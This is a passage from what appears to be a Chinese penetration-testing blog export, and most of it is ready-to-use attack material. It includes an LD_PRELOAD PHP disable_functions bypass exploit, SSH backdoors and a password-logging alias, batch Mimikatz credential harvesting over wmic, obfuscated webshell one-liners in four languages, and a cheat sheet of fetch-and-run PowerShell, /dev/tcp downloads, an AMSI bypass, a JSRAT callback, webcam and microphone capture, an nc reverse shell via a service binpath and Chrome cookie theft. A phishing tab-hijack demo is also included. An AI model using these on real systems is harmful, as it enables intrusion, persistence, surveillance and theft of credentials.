原理解读LD_PRELOAD的作用LD_PRELOAD是Linux系统的一个环境变量，它可以影响程序的运行时的链接（Runtimelinker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的 我们要做的就是通过修改环境变量LD_PRELOAD，让php启动新的进程的时候加载我们设置好的函数，比如说system()这样一来，就可以做到bypass了，只要启用了新的进程就有机会加载我们在上一个进程中构造的函数，通过测试可知mail可以创建新的进程，另外一个问题就是，如何构造我们想执行的函数，比如system() attribute((constructor))GCC 有个 C 语言扩展修饰符 attribute__((constructor))，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 __attribute((constructor)) 修饰的函数。 因此，可以通过这个方式来构造函数，把我们要执行的命令放在环境变量里，执行时直接加载环境变量的命令，就可以做到绕过了 代码类似这种#define _GNU_SOURCE #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/types.h&gt; __attribute__ ((__constructor__)) void preloadme (void) { unsetenv(&quot;LD_PRELOAD&quot;); const char* cmdline = getenv(&quot;EVIL_CMDLINE&quot;); system(cmdline); }工具使用https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD 复现gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc2.so 然后写利用如下php &lt;?php echo &quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc2.so &lt;/p&gt;&quot;; $cmd = $_GET[&quot;cmd&quot;]; $out_path = $_GET[&quot;outpath&quot;]; $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;; echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;; putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline); $so_path = $_GET[&quot;sopath&quot;]; putenv(&quot;LD_PRELOAD=&quot; . $so_path); mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;); echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;; unlink($out_path); ?&gt;然后访问http://192.168.44.139/bypass_disablefunc.php?cmd=whoami&amp;outpath=/tmp/xx&amp;sopath=/var/www/html/bypass_disablefunc2.so参考链接https://www.freebuf.com/articles/web/192052.html https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD来源:https://mp.weixin.qq.com/s/z98-KxxSeHVzHHssTLz-GQ]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
        <category>奇淫技巧</category>
        <category>Php特性</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[SSRF中的绕过姿势]]></title>
    <url>%2Farchives%2Fc0cf419.html</url>
    <content type="text"><![CDATA[从以下URL关键字中寻找SSRF漏洞： share wap url link src source target u 3g display sourceURl imageURL domain ...http://127.0.0.1/ 被过滤的时候，可以尝试一下几种方式： 1、@ http://abc@127.0.0.12、添加端口号 http://127.0.0.1:80803、短地址 http://dwz.cn/11SMa4、可以指向任意ip的域名：xip.io 10.0.0.1.xip.io 10.0.0.1 www.10.0.0.1.xip.io 10.0.0.1 mysite.10.0.0.1.xip.io 10.0.0.1 foo.bar.10.0.0.1.xip.io 10.0.0.15、ip地址转换成进制来访问 115.239.210.26 ＝ 16373751032首先把这四段数字给 转成 16 进制！结果：73 ef d2 1a 然后把 73efd21a 这十六进制一起转换成8进制！访问使用http://00+转换后十六进制 115.239.210.26 = 0x73.0xef.0xd2.0x1a八进制 115.239.210.26 = 0163.0357.0322.0032]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[不知道列名的情况下注入]]></title>
    <url>%2Farchives%2Fa90cd968.html</url>
    <content type="text"><![CDATA[0x00 简介mysql版本,低于5.4的除了堆叠,别的就写不了了在 mysql =&gt; 5 的版本中存在库information_schema,记录着mysql中所有表的结构，通常，在mysql sqli中，我们会通过此库中的表去获取其他表的结构，即表名，列名等。但是这个库也会经常被WAF过滤。当我们通过暴力破解获取到表名后，该如何进行下一步利用呢？ 在information_schema中，除了SCHEMATA，TABLES，COLUMNS有表信息外，高版本的mysql中，还有INNODB_TABLES及INNODB_COLUMNS中记录着表结构。0x01 不使用表名查询正常的查询如下： 其中，列名为id,name,pass,mail,phone，使用union查询 select 1,2,3,4,5 union select * from users; 接着，就可以继续使用数字来对应列,如3对应了表里面的pass: select `3` from (select 1,2,3,4,5 union select * from users)a; 当 ` 不能使用的时候，使用别名来代替： select b from (select 1,2,3 as b,4,5 union select * from users)a; 在注入中查询多个列： select concat(`2`,0x3a,`3`) from (select 1,2,3,4,5 union select * from users)a limit 1,1; 原文: 不知列名的情况下注入]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
        <category>奇淫技巧</category>
        <category>数据库特性</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[渗透过程中的SSH(后门建立)]]></title>
    <url>%2Farchives%2F21b719d6.html</url>
    <content type="text"><![CDATA[1.入侵得到SHELL后，对方防火墙没限制，想快速开放一个可以访问的SSH端口肉鸡上执行 ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=31337;就会派生一个31337端口，然后连接31337，用root/bin/ftp/mail当用户名，密码随意，就可登陆。 2.做一个SSH wrapper后门，效果比第一个好，没有开放额外的端口，只要对方开了SSH服务，就能远程连接在肉鸡上执行： [root@localhost ~]# cd /usr/sbin [root@localhost sbin]# mv sshd ../bin [root@localhost sbin]# echo &apos;#!/usr/bin/perl&apos; &gt;sshd [root@localhost sbin]# echo &apos;exec &quot;/bin/sh&quot; if (getpeername(STDIN) =~ /^..4A/);&apos; &gt;&gt;sshd [root@localhost sbin]# echo &apos;exec {&quot;/usr/bin/sshd&quot;} &quot;/usr/sbin/sshd&quot;,@ARGV,&apos; &gt;&gt;sshd [root@localhost sbin]# chmod u+x sshd [root@localhost sbin]# /etc/init.d/sshd restart 在本机执行： socat STDIO TCP4:10.18.180.20:22,sourceport=13377 如果你想修改源端口，可以用python的struct标准库实现 &gt;&gt;&gt; import struct &gt;&gt;&gt; buffer = struct.pack(&apos;&gt;I6&apos;,19526) &gt;&gt;&gt; print repr(buffer) &apos;\x00\x00LF&apos; &gt;&gt;&gt; buffer = struct.pack(&apos;&gt;I6&apos;,13377) &gt;&gt;&gt; print buffer 记录SSH客户端连接密码搞定主机后，往往想记录肉鸡SSH连接到其他主机的密码，进一步扩大战果，使用strace命令就行了。在肉鸡上修改要记录密码用户目录的.bashrc，添加一行: alias ssh=&apos;strace -o /tmp/.sshpwd-`date &apos;+%d%h%m%s&apos;`.log -e read.write.connect -s 2048 ssh&apos; 之后查看tmp目录的记录： grep &quot;read(5&quot; /tmp/.sshpwdxxxxxxxx.log]]></content>
      <categories>
        <category>渗透测试</category>
        <category>后渗透</category>
        <category>内网渗透</category>
        <category>权限维持</category>
        <category>Linux权限维持</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[域渗透中找DC]]></title>
    <url>%2Farchives%2Fbd98337b.html</url>
    <content type="text"><![CDATA[1.net view net view /domain2.set log set log3.通过srv记录 nslookup -type=SRV _ldap._tcp.corp4.使用nltest nltest /dclist:corp5.使用dsquery DsQuery Server -domain corp6.使用netdom netdom query pdc这些都是win系统自带的命令，有的时候win版本不同，有的命令会不存在，所以多一种方法，多一种成功的可能性，实际渗透，自行根据目标环境变换]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[使用Invoke-Mimikatz.ps1批量获取windows密码]]></title>
    <url>%2Farchives%2Fed9d09ca.html</url>
    <content type="text"><![CDATA[通常可以使用以下方式获取登陆windows的密码：powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://dwz.cn/1OropX&apos;); Invoke-Mimikatz -DumpCreds&quot;通常在域渗透的时候，我们可能想要获得更多的密码，针对server08以后的服务器获取ntds.dit的hash以后还不一定能破解出来,所以可以通过Mimikatz来获取明文密码，但是一台一台登陆去获取会很慢且不方便，所以这里介绍一个批量的方法： 1.创建共享文件夹： cd\ mkdir open net share open=C:\open /grant:everyone,full icacls C:\open\ /grant Everyone:(OI)(CI)F /t 修改注册表 reg change HKLM\System\CurrentControlSet\services\LanmanServer\Parameters NullSessionShares REG_MULTI_SZ open reg change HKLM\System\CurrentControlSet\Control\Lsa &quot;EveryoneIncludesAnonymous&quot; 1 修改共享目录到open。 2.在共享目录添加下列文件： 1）执行脚本powershellme.cmd，脚本内容： powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://192.168.1.11:8080/Invoke-Mimikatz.ps1&apos;); Invoke-Mimikatz -DumpCreds &gt; \\192.168.1.11\open\%COMPUTERNAME%.txt 2&gt;&amp;1 ip是设置共享的主机ip地址。 2）Invoke-Mimikatz.ps1 3）mongoose 4）服务器列表serverlist.txt，换行分割。 3.运行mongoose，默认开启端口8080 4.执行wmic： wmic /node:@serverlist.txt process call create &quot;\\192.168.1.11\open\powershellme.cmd&quot;带凭证： wmic /node:@serverlist.txt /user:PROJECTMENTOR\evi1cg /password:123 process call create &quot;\\192.168.1.11\open\powershellme.cmd&quot; 5.在共享目录看各个服务器的密码吧。 6.清除记录： 1）关掉mongoose,并删除 2）net share open /delete 3）删除共享目录及文件 4）修改注册表 PS:可以使用如下命令开启PowerShell remoting： psexec @serverlist.txt -u [admin account name] -p [admin account password] -h -d powershell.exe &quot;enable-psremotw]]></content>
      <categories>
        <category>渗透测试</category>
        <category>后渗透</category>
        <category>内网渗透</category>
        <category>提权(系统级)</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[「木马变形」一句话木马的各种变形]]></title>
    <url>%2Farchives%2F54ea983c.html</url>
    <content type="text"><![CDATA[0x00:简介 一句话木马短小精悍，而且功能强大，隐蔽性非常好，在入侵中始终扮演着强大的作用。一句话木马一直在跟杀软斗智斗勇，出现一种，杀软秒更新规则。木马再变形，再被杀。。。出现0x01:叙事 一、常见的一句话例子： **ASP:&lt;%eval request(&quot;pass&quot;)%&gt; ASPX:&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%Response.Write(eval(Request.Item[&quot;z&quot;],&quot;unsafe&quot;));%&gt; PHP:&lt;?php eval(@$_POST[&apos;a&apos;]); ?&gt; JSP:&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;));%&gt;//无回显示执行系统命令**二、简单变形**ASP:&lt;%eval&quot;&quot;&amp;(&quot;e&quot;&amp;&quot;v&quot;&amp;&quot;a&quot;&amp;&quot;l&quot;&amp;&quot;(&quot;&amp;&quot;r&quot;&amp;&quot;e&quot;&amp;&quot;q&quot;&amp;&quot;u&quot;&amp;&quot;e&quot;&amp;&quot;s&quot;&amp;&quot;t&quot;&amp;&quot;(&quot;&amp;&quot;0&quot;&amp;&quot;-&quot;&amp;&quot;2&quot;&amp;&quot;-&quot;&amp;&quot;5&quot;&amp;&quot;)&quot;&amp;&quot;)&quot;)%&gt;//-7 ASPX:&lt;%@ Page Language = Jscript %&gt; &lt;%var/*-/*-*/P/*-/*-*/=/*-/*-*/&quot;e&quot;+&quot;v&quot;+/*-/*-*/ &quot;a&quot;+&quot;l&quot;+&quot;(&quot;+&quot;R&quot;+&quot;e&quot;+/*-/*-*/&quot;q&quot;+&quot;u&quot;+&quot;e&quot;/*-/*-*/+&quot;s&quot;+&quot;t&quot;+ &quot;[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]&quot;+ &quot;,&quot;+&quot;\&quot;&quot;+&quot;u&quot;+&quot;n&quot;+&quot;s&quot;/*-/*-*/+&quot;a&quot;+&quot;f&quot;+&quot;e&quot;+&quot;\&quot;&quot;+&quot;)&quot;;eval (/*-/*-*/P/*-/*-*/,/*-/*-*/&quot;u&quot;+&quot;n&quot;+&quot;s&quot;/*-/*-*/+&quot;a&quot;+&quot;f&quot;+&quot;e&quot;/*-/*-*/);%&gt;//-7 PHP:&lt;?php $_GET[a]($_GET[b]);?&gt; JSP:&lt;% if(request.getParameter(&quot;f&quot;)!=null)(new java.io.FileOutputStream(application.getRealPath(&quot;\\&quot;)+request.getParameter(&quot;f&quot;))).write(request.getParameter(&quot;t&quot;).getBytes()); %&gt;**三、二次变形ASP:&lt;%if request (&quot;MH&quot;)&lt;&gt;&quot;&quot;then session(&quot;MH&quot;)=request(&quot;MH&quot;):end if:if session(&quot;MH&quot;)&lt;&gt;&quot;&quot; then execute session(&quot;MH&quot;)%&gt; ASPX:&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[FormsAuthentication.HashPasswordForStoringInConfigFile(String.Format(&quot;{0:yyyyMMdd}&quot;,DateTime.Now.ToUniversalTime())+&quot;37E4DD20C310142564FC483DB1132F36&quot;, &quot;MD5&quot;).ToUpper()],&quot;unsafe&quot;);%&gt;//随日期变化的连接密码 PHP:&lt;?php ($_=@$_GET[2]).@$_($_POST[1])?&gt;JSP：&lt;%new java.io.FileOutputStream(request.getParameter(&quot;f&quot;)).write(request.getParameter(&quot;c&quot;).getBytes());%&gt; 三次变形ASP:&lt;%@Page Language=&quot;C#&quot; %&gt;&lt;%@Import namespace=&quot;System.Reflection&quot;%&gt;&lt;%if (Request[&quot;pass&quot;]!=null){ Session.Add(&quot;k&quot;, Guid.NewGuid().ToString().Replace(&quot;-&quot;, &quot;&quot;).Substring(16)); Response.Write(Session[0]); return;}byte[] k = Encoding.Default.GetBytes(Session[0] + &quot;&quot;),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance(&quot;U&quot;).Equals(this);%&gt;//蚁剑中的一句话 PHP:&lt;?php session_start();isset($_GET[&apos;pass&apos;])?print $_SESSION[&apos;k&apos;]=substr(md5(uniqid(rand())),16):($b=explode(&apos;|&apos;,openssl_decrypt(file_get_contents(&quot;php://input&quot;), &quot;AES128&quot;, $_SESSION[&apos;k&apos;])))&amp;call_user_func($b[0],$b[1]);?&gt;//蚁剑中的一句话 JSP:&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%&gt;&lt;%if(request.getParameter(&quot;pass&quot;)!=null){String k=(&quot;&quot;+UUID.randomUUID()).replace(&quot;-&quot;,&quot;&quot;).substring(16);session.putValue(&quot;u&quot;,k);out.print(k);return;}Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec((session.getValue(&quot;u&quot;)+&quot;&quot;).getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%&gt;//蚁剑中的一句话四次变形 1、利用随机异或无限免杀d盾蚁剑版： 项目地址：https://github.com/yzddmr6/as_webshell_venom 2、利用动态二进制加密实现新型一句话木马： 文章地址：https://xz.aliyun.com/t/2799 第N次变形。。。。。 0x02:后话 一句话木马变形有很多种方式，文中举例只是其中几种方式。千奇百怪的变形，不断的变化，都是为了躲避杀软的检测。杀软也在不断的更新规则库。两者都是在博弈中不断的强大。 请勿非法利用 来源:微信公众号]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
        <category>奇淫技巧</category>
        <category>Waf特性</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Commands 搜集(持续更新)]]></title>
    <url>%2Farchives%2F7eaedcae.html</url>
    <content type="text"><![CDATA[Linux Linux反弹shell后，方便的交互：python -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;无python时：expect -c &apos;spawn bash;interact&apos;无wget nc等下载工具时下载文件exec 5&lt;&gt;/dev/tcp/sec-lab.org/80 &amp;&amp;echo -e “GET /c.pl HTTP/1.0\n” &gt;&amp;5 &amp;&amp; cat&lt;&amp;5 &gt; c.pl修改上传文件时间戳(掩盖入侵痕迹) touch -r 老文件时间戳 新文件时间戳利用BASH提权 这个要求管理员有su的习惯，我们可以通过它来添加一个id=0的用户$PROMPT_COMMAND 利用这个变量保存了在主提示符$PS1显示之前需要执行的命令导入: export PROMPT_COMMAND=”/usr/sbin/useradd -o -u 0 hack &amp;&gt;/dev/null &amp;&amp; echo hacker:123456 | /usr/sbin/chpasswd &amp;&gt;/dev/null &amp;&amp; unset PROMPT_COMMAND”lsof 命令lsof 1.txt 显示开启文件 abc.txt 的进程 lsof -i :22 知道 22 端口现在运行什么程序 lsof -c nsd 显示 nsd 进程现在打开的文件 lsof -g gid 显示归属 gid 的进程情况 lsof +d /usr/local/ 显示目录下被进程开启的文件 lsof +D /usr/local/ 同上，但是会搜索目录下的目录，时间较长 lsof -d 4 显示使用 fd 为4 的进程 lsof -i [i] 用以显示符合条件的进程情况SSH端口转发下面文章详细描述了3种方式转发 http://www.cnblogs.com/david-zhang-index/archive/2012/08/18/2645943.html图片马Exiftool “-comment&lt;=raj.php” 1.pngWindowsPowershell 相关 获取无线密码：powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Get-WLAN-Keys.ps1&apos;);Get-Wlan-Keys &quot;提权加账号powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1&apos;);Invoke-MS16-032 -Application cmd.exe -commandline &apos;/c net user evi1cg test123 /add&apos;&quot;下载执行：powershell -w hidden -c (new-object System.Net.WebClient).Downloadfile(&apos;http://b.hiphotos.baidu.com/image/pic/item/d009b3de9c82d15825ffd75c840a19d8bd3e42da.jpg&apos;,&apos;C:\\Users\Public\\test.jpg&apos;) &amp; start C:\\Users\\Public\\test.jpg摄像头录像：powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/xorrior/RandomPS-Scripts/master/MiniEye.ps1&apos;); Capture-MiniEye -RecordTime 2 -Path $env:temp\hack.avi&quot;录音:powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Exfiltration/Get-MicrophoneAudio.ps1&apos;);Get-MicrophoneAudio -Path $env:TEMP\secret.wav -Length 10 -Alias &apos;SECRET&apos;&quot; MSHTA VBSCRIPT EXEC mshta vbscript:CreateObject(&quot;Wscript.Shell&quot;).Run(&quot;calc.exe&quot;,0,true)(window.close) JAVASCRIPT EXEC mshta javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WScript.Shell&quot;).run(&quot;calc.exe&quot;,0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im mshta.exe&quot;,0,true);} JSRAT mshta javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://192.168.2.101:9998/connect&quot;,false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im mshta.exe&quot;,0,true);} Bypass AMSI: PS C:\&gt; [Ref].Assembly.GetType(&apos;System.Management.Automation.AmsiUtils&apos;).GetField(&apos;amsiInitFailed&apos;,&apos;NonPublic,Static&apos;).SetValue($null,$true) use: powershell.exe -ExecutionPolicy Bypass -noprofile [Ref].Assembly.GetType(&apos;&apos;System.Management.Automation.AmsiUtils&apos;&apos;).GetField(&apos;&apos;amsiInitFailed&apos;&apos;,&apos;&apos;NonPublic,Static&apos;&apos;).SetValue($null,$true);iex(New-Object Net.WebClient).DownloadString(&apos;&apos;http://192.168.230.1/msfpayload.ps1&apos;&apos;) Bypass AV sqlite3.exe -cmd &quot;select load_extension(&apos;1.txt&apos;,&apos;EP&apos;)&quot; sqlite3.exe -cmd &quot;select load_extension(&apos;\\192.168.1.101\share\1.txt&apos;,&apos;EP&apos;)&quot;mimikatz 获取vpn密码mimikatz.exe privilege::debug token::elevate lsadump::sam lsadump::secrets exit读取chrome cookiesmimikatz.exe privilege::debug log &quot;dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\cookies /unprotect&quot; exit mimikatz.exe privilege::debug log &quot;dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\USERDA~1&quot; exit mimikatz.exe privilege::debug log &quot;dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\LOGIND~1&quot; exit提权常用// What system are we connected to? systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;// Get the hostname and username (if available) hostname echo %username%// Get users net users net user [username]// Networking stuff ipconfig /all// Printer? route print// ARP-arific arp -A// Active network connections netstat -ano// Firewall fun (Win XP SP2+ only) netsh firewall show state netsh firewall show config// Scheduled tasks schtasks /query /fo LIST /v// Running processes to started services tasklist /SVC net start// Driver madness DRIVERQUERY// WMIC fun (Win 7/8 – XP requires admin) wmic /?//Use wmic_info script! // WMIC: check patch level wmic qfe get Caption,Description,HotFixID,InstalledOn// Search pathces for given patch wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KB..&quot;// AlwaysInstallElevated fun reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated// Other commands to run to hopefully get what we need dir /s *pass* == *cred* == *vnc* == *.config* findstr /si password *.xml *.ini *.txt reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s// Service permissions sc query sc qc [service_name]// Accesschk stuff download link accesschk.exe /accepteula (always do this first!!!!!) accesschk.exe -ucqv [service_name] (requires sysinternals accesschk!) accesschk.exe -uwcqv &quot;Authenticated Users&quot; * (won&apos;t yield anything on Win 8) accesschk.exe -ucqv [service_name]// Find all weak folder permissions per drive. accesschk.exe -uwdqs Users c:\ accesschk.exe -uwdqs &quot;Authenticated Users&quot; c:\// Find all weak file permissions per drive. accesschk.exe -uwqs Users c:\*.* accesschk.exe -uwqs &quot;Authenticated Users&quot; c:\*.*// Binary planting sc config [service_name] binpath= &quot;C:\nc.exe -nv [RHOST] [RPORT] -e C:\WINDOWS\System32\cmd.exe&quot; sc config [service_name] obj= &quot;.\LocalSystem&quot; password= &quot;&quot; sc qc [service_name] (to verify!) net start [service_name] CMD %ProgramData:~0,1%%ProgramData:~9,2% /c echo命令行下载certutil -urlcache -split -f example.com/file命令行下连接VPN(win):rasdial &quot;VPN Connection&quot; zhaodg oZ7iFk25命令行关闭VPN连接(win):rasphone -h &quot;VPN Connection&quot;通过pptpsetup(Linux):pptpsetup --create vpn --server 5x.xxx.xxx.xx2 --username zhaodg --password oZ7iFk25 --encrypt --start注册表运行程序(用来整蛊挺好玩):reg add &quot;HKCU\Software\Classes\Folder\shell\open\command&quot; /d &quot;cmd.exe /c cmd.exe&quot; /f &amp;&amp; reg add HKCU\Software\Classes\Folder\shell\open\command /v &quot;DelegateExecute&quot; /f 删除命令:reg delete &quot;HKCU\Software\Classes\Folder\shell\open\command&quot; /f]]></content>
      <categories>
        <category>渗透测试</category>
        <category>后渗透</category>
        <category>信息收集</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[「应急响应」应急响应实战笔记,一个安全工程师的自我修养]]></title>
    <url>%2Farchives%2Fdf6dc829.html</url>
    <content type="text"><![CDATA[应急响应实战笔记,一个安全工程师的自我修养。 项目目录[第一章：应急响应]第1篇:Window入侵排查 第2篇:Linux入侵排查[第二章：日志分析] 第1篇:Window日志分析 第2篇:Linux日志分析 第3篇:Web日志分析 第4篇:MSSQL日志分析 第5篇:MySQL日志分析[第三章:Windows实战篇]第1篇：FTP暴力破解 第2篇：蠕虫病毒 第3篇：勒索病毒 第4篇：ARP病毒 第5篇：挖矿病毒（一） 第6篇：挖矿病毒（二）[第四章：Linux实战篇]第1篇：SSH暴力破解 第2篇：捕捉短连接 第3篇：挖矿病毒 第4篇：盖茨木马 第5篇：DDOS病毒 第6篇：Shell病毒[第五章：Web实战篇]第1篇：网站被植入Webshell 第2篇：门罗币恶意挖矿 第3篇：批量挂黑页 第4篇：新闻源网站劫持 第5篇：移动端劫持 第6篇：搜索引擎劫持 第7篇：网站首页被篡改 第8篇：管理员账号被篡改]]></content>
      <categories>
        <category>渗透测试</category>
        <category>应急响应</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[「前端钓鱼欺骗」前端黑魔法之远程控制地址栏]]></title>
    <url>%2Farchives%2F2db90a41.html</url>
    <content type="text"><![CDATA[由于今天看到一篇文章《危险的 target=”_blank” 与 “opener”》，里面提到了一个老知识点，就是target=”_blank”的时候，新打开的页面可以通过window.opener来控制源页面的URL，进行钓鱼攻击。这个攻击手法我在博客《神奇的opener对象》中也说过，这里就不再赘述了。这篇文章抛出另一种与target有关的钓鱼攻击。 0x01 效果演示 首先可以看一个小例子： http://675ba661.w1n.pw/41593a见上图，打开上述链接，然后点击“click me”，打开了百度。这时查看地址栏，的的确确是百度，然后我们等待10秒，再次查看地址栏，这个时候已经变成攻击者的网址了；即使此时我们再访问淘宝等页面，只要仍然在这个标签页下，地址栏就仍然会被控制。 0x02 原理说明上述页面的代码也很简单： &lt;html&gt; &lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt; &lt;body&gt; &lt;a href=&quot;https://www.baidu.com&quot; target=&quot;baidu&quot; id=&quot;baidu&quot; onclick=&quot;return start()&quot;&gt;click me&lt;/a&gt; &lt;script&gt; function start() { setInterval(function() { baidu.href=&quot;http://675ba661.w1n.pw/baidu&quot;; baidu.click(); }, 10000); } &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;如果用户点击了超链接“click me”，这里会启动一个循环定时器，每过10秒钟，将会将超链接的地址更换成一个仿百度的钓鱼网站，并再次点击。（当然，如果是真实攻击的话，最好是做一个真实目标的反代服务器，这个在我另一篇文章《openresty+lua在反向代理服务中的玩法》中也有详细的介绍） 这里，超链接的target属性指定目标URL在哪个页面下打开，就是目标页面的window.name。如果这个a标签的href发生了变化，再次点击链接，页面仍然会在相同的标签页下打开，所以就覆盖了上一次打开的页面。 比如，我们是一个“网址导航”类型的恶意网站，用户在我们网站上打开了百度、淘宝等标签页面，我们将可以根据用户打开的超链接来生成钓鱼页面，伪造这些网站的登录页面，精准地进行钓鱼。我这里就不进行演示了。 0x03 扩展尝试除了超链接以外，用window.open也可以达到一样的效果： &lt;html&gt; &lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt; &lt;body&gt; &lt;a href=&quot;javascript:;&quot; onclick=&quot;return start()&quot;&gt;click me&lt;/a&gt; &lt;script&gt; function start() { var w = window.open(&apos;https://www.baidu.com&apos;, &apos;baidu&apos;); setInterval(function() { w.location = &apos;http://675ba661.w1n.pw/baidu&apos; }, 5000) } &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;不过，window.open经常会被广告拦截相关的功能给阻止掉，所以可能效果不如直接用超链接。 那么，继续深入研究。这个现象究竟是否和window.name有关呢？那么是不是我们知道了某个页面的name，即可对其页面的URL进行控制？ 我们可以做一个实验。编写A页面（ http://a.675ba661.w1n.pw/A_victim ）： &lt;html&gt; &lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt; &lt;body&gt; &lt;p&gt;Hello world.&lt;/p&gt; &lt;script&gt; window.name = &apos;baidu&apos;; &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;编写B页面（ http://b.675ba661.w1n.pw/B_attacker ）： &lt;html&gt; &lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt; &lt;body&gt; &lt;a href=&quot;https://www.baidu.com&quot; target=&quot;baidu&quot; id=&quot;baidu&quot;&gt;click me&lt;/a&gt; &lt;/body&gt; &lt;/html&gt;A页面是目标网站，其中设置自己的name是baidu；B是攻击者的页面，其中设置target=”baidu”。 显然，我们在B中点击“click me”以后，会打开一个新的页面，而不是修改A页面的URL。这个实验说明，URL的远程控制和window.name没有直接关系，而是和页面的父子关系有关。 总结本文所描述的攻击方式和opener的攻击方式比较相似，都是在不能跨域的情况下，控制目标标签页的URL，进而进行钓鱼攻击。 但我觉得这个攻击持久型更佳，因为即使用户在新标签中输入自己的域名，或者又通过超链接点击到其他网站里，这个页面的地址栏永远是受到源页面的控制的。理论上在源页面不关闭的情况下，可以永久控制新页面的地址栏。]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
        <category>奇淫技巧</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Hashpump实现哈希长度扩展攻击]]></title>
    <url>%2Farchives%2Fa5b396d3.html</url>
    <content type="text"><![CDATA[Hashpump实现哈希长度扩展攻击]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
        <category>奇淫技巧</category>
        <category>CTF</category>
